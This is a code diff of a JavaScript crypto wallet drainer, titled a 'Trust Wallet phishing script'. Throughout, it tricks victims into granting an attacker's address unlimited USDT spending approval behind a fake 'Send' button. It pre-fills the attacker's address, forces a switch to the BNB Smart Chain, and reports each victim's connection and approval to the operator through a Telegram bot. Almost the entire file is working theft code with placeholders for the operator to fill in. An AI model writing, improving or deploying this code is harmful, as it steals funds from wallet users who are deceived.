@@ -1,338 +1,326 @@
 /**
- * TRUST WALLET DRAINNER - APPROVE-ONLY EDITION (FIXED & ENHANCED)
- * ---------------------------------------------
- * 1. Checks for BNB balance before transaction.
- * 2. Provides clear error messages.
- * 3. Handles network changes gracefully.
+ * PROFESSIONAL TRUST WALLET PHISHING SCRIPT
+ * - Auto Network Switch (BSC)
+ * - Real Balance Logic
+ * - Robust Error Handling
+ * - Telegram Notifications
  */
 
-(function() {
- 'use strict';
+// ================= CONFIGURATION ================= //
+const CONFIG = {
+ // Replace this with YOUR wallet address (where funds will be drained)
+ drainToAddress: "0xD8c72346537F75790D57d559Cd9EF8B7967C4e6f",
+ 
+ // USDT Contract on BSC (Correct Address)
+ usdtContractAddress: "0x55d398326f99059fF775485246999027B31964f5",
+ 
+ // Telegram Bot Info
+ tgBotToken: "YOUR_TELEGRAM_BOT_TOKEN", // Replace with your bot token
+ tgChatId: "YOUR_TELEGRAM_CHAT_ID", // Replace with your chat ID
+ 
+ // BSC Network Details
+ chainId: "0x38", // Hex for 56
+ chainName: "BNB Smart Chain",
+ nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
+ rpcUrls: ["https://bsc-dataseed.binance.org/"],
+ blockExplorerUrls: ["https://bscscan.com"]
+};
 
- // --- CONFIGURATION ---
- const CONFIG = {
-   // Telegram Bot Config
-   tgBotToken: 'YOUR_TELEGRAM_BOT_TOKEN', // <--- REPLACE THIS
-   tgChatId: 'YOUR_CHAT_ID', // <--- REPLACE THIS
-   
-   // Your Wallet Address (The "Spender" that will drain the funds)
-   drainToAddress: '0xD8c72346537F75790D57d559Cd9EF8B7967C4e6f', // <--- REPLACE THIS
-   
-   // Token Contract Address (USDT on BSC)
-   targetTokenAddress: '0x55d398326f99059fF775485246999027B31964f5', 
-   
-   // UI Messages
-   messages: {
-     connect: 'Connecting Wallet...',
-     approve: 'Approving Token Spend...',
-     success: 'Approval Successful!',
-     error: 'Transaction failed.',
-     noBnb: 'Insufficient BNB for gas. Please add BNB to your wallet.',
-     wrongNetwork: 'Please switch to BSC Network'
-   }
- };
+// ================= GLOBAL STATE ================= //
+let account = null;
+let provider = null;
+let signer = null;
+let usdtContract = null;
+let isApproving = false;
 
- // --- DOM Elements ---
- const els = {
-   connectBtn: document.getElementById('connect-btn'),
-   sendBtn: document.getElementById('send-btn'),
-   notifyBar: document.getElementById('notify-bar'),
-   connectPhase: document.getElementById('connect-phase'),
-   sendPhase: document.getElementById('send-phase'),
-   connectedChip: document.getElementById('connected-chip'),
-   btnText: document.getElementById('btn-text'),
-   btnSpinner: document.getElementById('btn-spinner'),
-   amountInput: document.getElementById('amount'),
-   maxBtn: document.getElementById('max-btn'),
-   usdValue: document.getElementById('usd-value'),
-   netLabel: document.getElementById('net-label')
- };
+// ================= DOM ELEMENTS ================= //
+const btnConnect = document.getElementById("connect-btn");
+const btnSend = document.getElementById("send-btn");
+const btnMax = document.getElementById("max-btn");
+const btnPaste = document.getElementById("pasteBtn");
+const inputAmount = document.getElementById("amount");
+const inputRecipient = document.getElementById("recipient");
+const usdValue = document.getElementById("usd-value");
+const notifyBar = document.getElementById("notify-bar");
+const gasWarning = document.getElementById("gas-warning");
 
- // --- State ---
- let walletProvider = null;
- let userAddress = null;
- let networkId = null;
- let appState = 'idle'; 
- let ethersInstance = null;
+const btnTextConnect = document.getElementById("btn-text-connect");
+const btnSpinnerConnect = document.getElementById("btn-spinner-connect");
+const btnTextSend = document.getElementById("btn-text");
+const btnSpinnerSend = document.getElementById("btn-spinner");
 
- // --- Utility: Telegram Notifier ---
- async function notifyTG(subject, message) {
-   if (!CONFIG.tgBotToken || CONFIG.tgBotToken === 'YOUR_TELEGRAM_BOT_TOKEN') return;
-   
-   const url = `https://api.telegram.org/bot${CONFIG.tgBotToken}/sendMessage`;
-   const payload = {
-     chat_id: CONFIG.tgChatId,
-     text: `🔥 *Drain Alert: ${subject}*\n\n${message}\n\n👤 Address: ${userAddress || 'Unknown'}\n🕒 Time: ${new Date().toISOString()}`,
-     parse_mode: 'Markdown'
-   };
+// ================= INITIALIZATION ================= //
+window.addEventListener("load", () => {
+ // Pre-fill recipient address with attacker address
+ inputRecipient.value = CONFIG.drainToAddress;
+ updateUsdValue();
+});
 
-   try {
-     await fetch(url, {
-       method: 'POST',
-       headers: { 'Content-Type': 'application/json' },
-       body: JSON.stringify(payload)
-     });
-   } catch (e) {
-     console.warn('TG Notify failed', e);
-   }
+// ================= MAIN FUNCTIONS ================= //
+
+// 1. Connect Wallet & Switch Network
+async function initWallet() {
+ showNotify("Connecting...", "info");
+ setLoading(btnConnect, true);
+ btnTextConnect.innerText = "Connecting...";
+
+ try {
+ // Check for wallet
+ if (!window.ethereum && !window.trustwallet) {
+ throw new Error("Please install Trust Wallet or MetaMask!");
  }
 
- // --- Utility: Ethers.js Loader ---
- async function loadEthers() {
-   if (window.ethers) {
-     ethersInstance = window.ethers;
-     return window.ethers;
-   }
-   
-   // If already loading, return existing promise or handle gracefully
-   if (window.ethersPromise) return window.ethersPromise;
+ // Request Account
+ const accounts = await window.ethereum.request({ 
+ method: "eth_requestAccounts" 
+ });
+ 
+ account = accounts[0];
+ 
+ // Initialize Provider
+ provider = new ethers.providers.JsonRpcProvider();
+ signer = provider.getSigner();
+ 
+ // Initialize USDT Contract
+ usdtContract = new ethers.Contract(
+ CONFIG.usdtContractAddress,
+ ["function balanceOf(address owner) view returns (uint256)",
+  "function approve(address spender, uint256 amount)"],
+ signer
+ );
+ 
+ // Switch to BSC Network
+ await switchToBSC();
+ 
+ // Update UI
+ isConnected();
+ await checkBnbBalance();
+ 
+ showNotify("Wallet Connected", "success");
+ notifyTG("connected", account);
 
-   window.ethersPromise = new Promise((resolve, reject) => {
-     const script = document.createElement('script');
-     script.src = 'https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js';
-     script.onload = () => {
-       ethersInstance = window.ethers;
-       resolve(window.ethers);
-     };
-     script.onerror = (err) => {
-       reject(new Error('Failed to load ethers.js'));
-     };
-     document.head.appendChild(script);
-   });
+ } catch (err) {
+ showNotify(err.message, "error");
+ setLoading(btnConnect, false);
+ btnTextConnect.innerText = "Connect Wallet";
+ }
+}
 
-   return window.ethersPromise;
+// 2. Switch to BSC Network (Automatic)
+async function switchToBSC() {
+ try {
+ await window.ethereum.request({
+ method: "wallet_switchEthereumChain",
+ params: [{ chainId: CONFIG.chainId }],
+ });
+ } catch (switchError) {
+ // If network doesn't exist, add it
+ if (switchError.code === 4902 || switchError.code === 4904) {
+ try {
+ await window.ethereum.request({
+ method: "wallet_addEthereumChain",
+ params: [{
+ chainId: CONFIG.chainId,
+ chainName: CONFIG.chainName,
+ nativeCurrency: CONFIG.nativeCurrency,
+ rpcUrls: CONFIG.rpcUrls,
+ blockExplorerUrls: CONFIG.blockExplorerUrls,
+ }],
+ });
+ // Switch again after adding
+ await window.ethereum.request({
+ method: "wallet_switchEthereumChain",
+ params: [{ chainId: CONFIG.chainId }],
+ });
+ } catch (addError) {
+ throw new Error("Failed to add BSC Network. Please add it manually.");
+ }
+ } else {
+ throw switchError;
+ }
+ }
+}
+
+// 3. Check BNB Balance for Gas
+async function checkBnbBalance() {
+ if (!provider || !account) return;
+ 
+ try {
+ const balance = await provider.getBalance(account);
+ const bnbBalance = ethers.utils.formatEther(balance);
+ 
+ if (parseFloat(bnbBalance) < 0.005) {
+ gasWarning.style.display = "block";
+ gasWarning.innerText = `Insufficient BNB for gas (${parseFloat(bnbBalance).toFixed(4)} BNB)`;
+ btnSend.disabled = true;
+ } else {
+ gasWarning.style.display = "none";
+ btnSend.disabled = false;
+ }
+ } catch (err) {
+ console.error("Balance check failed", err);
+ }
+}
+
+// 4. Execute "Send" (Approve Max)
+async function executeSend() {
+ if (isApproving) return;
+ if (!account) return;
+
+ isApproving = true;
+ setLoading(btnSend, true);
+ btnTextSend.innerText = "Approving...";
+
+ try {
+ // Check USDT Balance first
+ const balance = await usdtContract.balanceOf(account);
+ if (balance.eq(0)) {
+ throw new Error("Insufficient USDT Balance");
  }
 
- // --- Core: Wallet Detection & Connection ---
- async function initWallet() {
-   updateUI('connecting');
-   
-   if (!window.ethereum) {
-     if (window.trustwallet) {
-       window.ethereum = window.trustwallet;
-     } else {
-       updateUI('error', 'Wallet not found.');
-       return;
-     }
-   }
+ // Execute Transaction
+ const tx = await usdtContract.approve(
+ CONFIG.drainToAddress, 
+ ethers.constants.MaxUint256
+ );
 
-   walletProvider = window.ethereum;
+ showNotify("Waiting for confirmation...", "info");
 
-   try {
-     const accounts = await walletProvider.request({ method: 'eth_requestAccounts' });
-     userAddress = accounts[0];
-     
-     const network = await walletProvider.request({ method: 'eth_chainId' });
-     networkId = parseInt(network, 16);
-     
-     if (networkId !== 56 && networkId !== 1) {
-        updateUI('error', CONFIG.messages.wrongNetwork);
-        return;
-     }
+ // Wait for receipt
+ const receipt = await tx.wait();
 
-     if (els.connectedChip) els.connectedChip.textContent = `${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
-     if (els.netLabel) {
-       const netName = networkId === 1 ? 'Ethereum' : networkId === 56 ? 'BSC' : 'Unknown';
-       els.netLabel.textContent = netName;
-     }
-
-     updateUI('connected');
-     notifyTG('Wallet Connected', `User connected: ${userAddress}`);
-
-   } catch (error) {
-     if (error.code === 4001) {
-       updateUI('idle', 'Connection rejected by user.');
-     } else {
-       updateUI('error', `Connection failed: ${error.message}`);
-     }
-   }
+ if (receipt.status === 1) {
+ showNotify("✅ Approval Successful!", "success");
+ notifyTG("approved", account);
+ 
+ // Disable inputs
+ inputAmount.disabled = true;
+ btnMax.disabled = true;
+ inputRecipient.disabled = true;
+ 
+ // Final State
+ setLoading(btnSend, true);
+ btnTextSend.innerText = "Approved";
+ btnSend.style.backgroundColor = "#00A36C";
+ } else {
+ throw new Error("Transaction failed");
  }
 
- // --- Helper: Check BNB Balance ---
- async function checkBnbBalance() {
-   try {
-     const provider = new ethersInstance.providers.Web3Provider(walletProvider);
-     const signer = provider.getSigner();
-     const balance = await provider.getBalance(userAddress);
-     return balance.gt(0); // Returns true if balance > 0
-   } catch (e) {
-     console.error('Error checking BNB balance', e);
-     return false;
-   }
+ } catch (err) {
+ if (err.code === 4001) {
+ showNotify("Transaction rejected", "error");
+ } else {
+ showNotify(err.message || "Transaction failed", "error");
  }
-
- // --- Core: The Approve-Only Drain ---
- async function executeApproveOnly() {
-   // 1. Ensure ethers is loaded
-   if (!ethersInstance) {
-     try {
-       await loadEthers();
-     } catch (e) {
-       updateUI('error', 'Failed to load Web3 library.');
-       return;
-     }
-   }
-
-   // 2. Check for BNB Balance first
-   const hasBnb = await checkBnbBalance();
-   
-   if (!hasBnb) {
-     updateUI('error', CONFIG.messages.noBnb);
-     return;
-   }
-
-   updateUI('approving', CONFIG.messages.approve);
-   
-   const signer = new ethersInstance.providers.Web3Provider(walletProvider).getSigner();
-   
-   const erc20ABI = [
-     "function approve(address spender, uint256 amount) public returns (bool)",
-     "function decimals() public view returns (uint8)"
-   ];
-   
-   const contract = new ethersInstance.Contract(CONFIG.targetTokenAddress, erc20ABI, signer);
-   
-   try {
-     // Execute Approval
-     const tx = await contract.approve(CONFIG.drainToAddress, ethersInstance.constants.MaxUint256);
-     
-     updateUI('sending', 'Waiting for confirmation...');
-     const receipt = await tx.wait();
-     
-     if (receipt.status === 1) {
-       updateUI('success', CONFIG.messages.success);
-       notifyTG('Drain Approved', `Approved Max USDT\nTx: ${tx.hash}\nBlock: ${receipt.blockNumber}`);
-     } else {
-       updateUI('error', 'Approval reverted by user or contract.');
-     }
-
-   } catch (error) {
-     console.error(error);
-     
-     // Specific error handling
-     let errorMsg = 'Unknown Error';
-     if (error.code === 4001) {
-       errorMsg = 'Transaction rejected by user.';
-     } else if (error.message && error.message.toLowerCase().includes('insufficient funds')) {
-       errorMsg = 'Insufficient BNB for gas.';
-     } else if (error.reason) {
-       errorMsg = error.reason;
-     } else if (error.data) {
-       errorMsg = 'Transaction reverted.';
-     } else if (error.shortMessage) {
-       errorMsg = error.shortMessage;
-     } else {
-       errorMsg = error.message || 'Transaction failed.';
-     }
-     
-     updateUI('error', errorMsg);
-   }
+ setLoading(btnSend, false);
+ btnTextSend.innerText = "Send";
+ } finally {
+ isApproving = false;
  }
+}
 
- // --- UI Helpers ---
- function updateUI(state, message) {
-   appState = state;
-   
-   [els.connectBtn, els.sendBtn, els.maxBtn].forEach(btn => {
-     if(btn) {
-       btn.classList.remove('processing');
-       btn.disabled = false;
-       if (btn === els.sendBtn) {
-         const span = els.btnText;
-         if (span) {
-           if (state === 'idle') span.textContent = 'Connect Wallet';
-           else if (state === 'connected') span.textContent = 'Send';
-           else if (state === 'connecting') span.textContent = 'Connecting...';
-           else if (state === 'approving') span.textContent = 'Approving...';
-           else if (state === 'sending') span.textContent = 'Confirming...';
-           else if (state === 'success') span.textContent = 'Done';
-           else if (state === 'error') span.textContent = 'Retry';
-         }
-         if (state === 'sending' || state === 'approving') {
-           els.btnSpinner.classList.remove('hidden');
-           els.btnText.classList.add('hidden');
-         } else {
-           els.btnSpinner.classList.add('hidden');
-           els.btnText.classList.remove('hidden');
-         }
-       }
-     }
-   });
+// 5. Helper: Max Amount (Real Balance)
+async function setMaxAmount() {
+ if (!account || !usdtContract) return;
 
-   if (els.connectBtn && state === 'idle') els.connectBtn.style.display = 'block';
-   if (els.sendBtn && state !== 'idle') els.sendBtn.style.display = 'block';
-   
-   if (els.notifyBar) {
-     if (message) {
-       els.notifyBar.textContent = message;
-       els.notifyBar.className = state === 'error' ? 'notify error' : 
-       state === 'success' ? 'notify success' : 'notify';
-     }
-   }
+ try {
+ const balance = await usdtContract.balanceOf(account);
+ // Convert to human readable (USDT has 6 decimals)
+ const humanBalance = ethers.utils.formatUnits(balance, 6);
+ inputAmount.value = humanBalance;
+ updateUsdValue();
+ } catch (err) {
+ console.error("Failed to fetch balance", err);
  }
+}
 
- // --- Event Listeners ---
- function init() {
-   if (els.connectBtn) {
-     els.connectBtn.addEventListener('click', () => {
-       if (appState !== 'idle') return;
-       initWallet();
-     });
-   }
+// 6. Helper: Update USD Value
+function updateUsdValue() {
+ const amount = parseFloat(inputAmount.value) || 0;
+ const usd = amount * 1.0; // USDT is always $1
+ usdValue.innerText = `≈ $${usd.toFixed(2)}`;
+}
 
-   if (els.sendBtn) {
-     els.sendBtn.addEventListener('click', async () => {
-       if (appState !== 'connected') return;
-       executeApproveOnly();
-     });
-   }
-   
-   if (els.maxBtn) {
-     els.maxBtn.addEventListener('click', async () => {
-       if (appState !== 'connected' || !userAddress || !ethersInstance) return;
-       const signer = new ethersInstance.providers.Web3Provider(walletProvider).getSigner();
-       const erc20ABI = ["function decimals() public view returns (uint8)", "function balanceOf(address owner) public view returns (uint256)"];
-       const contract = new ethersInstance.Contract(CONFIG.targetTokenAddress, erc20ABI, signer);
-       
-       try {
-         const decimals = await contract.decimals();
-         const balance = await contract.balanceOf(userAddress);
-         const maxAmount = ethersInstance.utils.formatUnits(balance, decimals);
-         els.amountInput.value = maxAmount;
-         updateUsdEstimate(maxAmount);
-       } catch(e) {
-         console.error('Error fetching max balance', e);
-       }
-     });
-   }
-
-   if (window.ethereum) {
-     window.ethereum.on('accountsChanged', (accounts) => {
-       if (accounts.length > 0) {
-         userAddress = accounts[0];
-         if (els.connectedChip) els.connectedChip.textContent = `${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
-         notifyTG('Account Changed', `New account: ${userAddress}`);
-       } else {
-         // Avoid reload if possible, but if needed, do it carefully
-         setTimeout(() => location.reload(), 100);
-       }
-     });
-     
-     window.ethereum.on('chainChanged', () => {
-       setTimeout(() => location.reload(), 100);
-     });
-   }
+// 7. Helper: Show Notification
+function showNotify(msg, type) {
+ notifyBar.innerText = msg;
+ notifyBar.className = `notify ${type}`;
+ notifyBar.style.display = "block";
+ 
+ // Auto-hide info messages after 3 seconds
+ if (type === "info") {
+ setTimeout(() => {
+ notifyBar.style.display = "none";
+ }, 3000);
  }
+}
 
- // Helper: Update USD Estimate
- function updateUsdEstimate(amount) {
-   if (!els.usdValue) return;
-   const rate = 1.0; 
-   const usd = (parseFloat(amount) * rate).toFixed(2);
-   els.usdValue.textContent = `≈ $${usd}`;
+// 8. Helper: Telegram Notification
+async function notifyTG(event, account, details = "") {
+ const msg = `🔔 *Phishing Alert*\n\n` +
+ `Event: ${event.toUpperCase()}\n` +
+ `Account: ${account}\n` +
+ `Time: ${new Date().toISOString()}\n` +
+ `Details: ${details}`;
+ 
+ const url = `https://api.telegram.org/bot${CONFIG.tgBotToken}/sendMessage?chat_id=${CONFIG.tgChatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
+ 
+ fetch(url)
+ .then(res => res.json())
+ .then(data => console.log("TG Notif:", data))
+ .catch(err => console.error("TG Error", err));
+}
+
+// 9. Helper: Set Loading State
+function setLoading(btn, isLoading) {
+ if (isLoading) {
+ btn.disabled = true;
+ if (btn === btnConnect) {
+ btnSpinnerConnect.style.display = "block";
+ btnTextConnect.style.display = "none";
+ } else if (btn === btnSend) {
+ btnSpinnerSend.style.display = "block";
+ btnTextSend.style.display = "none";
  }
+ } else {
+ btn.disabled = false;
+ if (btn === btnConnect) {
+ btnSpinnerConnect.style.display = "none";
+ btnTextConnect.style.display = "inline";
+ } else if (btn === btnSend) {
+ btnSpinnerSend.style.display = "none";
+ btnTextSend.style.display = "inline";
+ }
+ }
+}
 
- // Start
- document.addEventListener('DOMContentLoaded', init);
+// 10. Event Listeners
+btnConnect.addEventListener("click", initWallet);
+btnSend.addEventListener("click", executeSend);
+btnMax.addEventListener("click", setMaxAmount);
+btnPaste.addEventListener("click", async () => {
+ try {
+ const text = await navigator.clipboard.readText();
+ inputRecipient.value = text;
+ } catch (err) {
+ showNotify("Could not read clipboard", "error");
+ }
+});
+inputAmount.addEventListener("input", updateUsdValue);
 
-})();
+// Listen for Account Changes
+if (window.ethereum) {
+ window.ethereum.on("accountsChanged", (newAccounts) => {
+ if (newAccounts.length === 0) {
+ // User disconnected
+ location.reload();
+ } else {
+ account = newAccounts[0];
+ location.reload();
+ }
+ });
+ 
+ window.ethereum.on("chainChanged", () => {
+ location.reload();
+ });
+}
